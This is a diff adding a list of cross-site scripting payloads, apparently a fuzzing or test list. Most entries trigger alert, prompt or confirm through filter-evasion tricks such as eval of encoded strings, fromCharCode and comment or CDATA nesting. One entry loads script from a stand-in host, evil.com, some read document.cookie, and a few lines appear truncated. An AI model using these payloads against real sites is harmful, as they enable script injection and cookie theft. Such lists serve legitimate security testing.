@@ -1,0 +1,34 @@
+<script>alert(1)</script><script>
+<script>/*--></script><svg/onload=alert(1)><!--</script>
+<script><!--
+alert(1)
+--></script>
+<script><![CDATA[alert(1)]]></script>
+<script><!--/*--><![CDATA[*/alert(1)//]]></script>
+<script src=javascript:alert(1)></script>
+<script src=//evil.com/xss.js></script>
+<script>document.write("<img src=x onerror=alert(1)>")</script>
+<script>document.body.innerHTML='<img src=x onerror=alert(1)>'</script>
+<script>setTimeout('alert(1)',0)</script>
+<script>setTimeout(()=>alert(1),0)</script>
+<script>eval('alert(1)')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+<script>Function('alert(1)')()</script>
+<script>new Function('alert(1)')()</script>
+<script>var x=alert; x(1)</script>
+<script>window </script>
+<script>window </script>
+<script>window </script>
+<script>eval('al'+'ert(1)')</script>
+<script>eval(`al\u0065rt(1)`)</script>
+<script>eval(String.raw`alert(1)`)</script>
+<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
+<script>eval(decodeURIComponent('%61%6C%65%72%74(1)'))</script>
+<script>eval(unescape('%61%6C%65%72%74(1)'))</script>
+<script>eval(`${'al' + 'ert'}(1)`)</script>
+<script>eval('alert'.concat('(1)'))</script>
+<script>eval('con'+'firm(1)')</script>
+<script>eval('prompt(1)')</script>
+<script>eval('alert(document.domain)')</script>
+<script>eval('prompt(document.cookie)')</script>
+<script>eval('confirm(document.location)')</script>
